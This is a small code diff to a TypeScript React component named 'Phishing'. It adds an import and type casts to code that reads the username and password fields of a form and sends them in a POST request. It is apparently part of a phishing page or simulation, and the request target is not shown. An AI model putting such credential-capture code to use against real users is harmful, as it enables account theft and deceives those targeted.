@@ -1,3 +1,5 @@
+import React from 'react'
+
 export default function Phishing() {
   const [url, setUrl] = React.useState('')
 
@@ -9,8 +11,8 @@ export default function Phishing() {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        username: document.getElementById('username').value,
-        password: document.getElementById('password').value,
+        username: (document.getElementById('username') as HTMLInputElement).value,
+        password: (document.getElementById('password') as HTMLInputElement).value,
       }),
     })
       .then((res) => res.json())
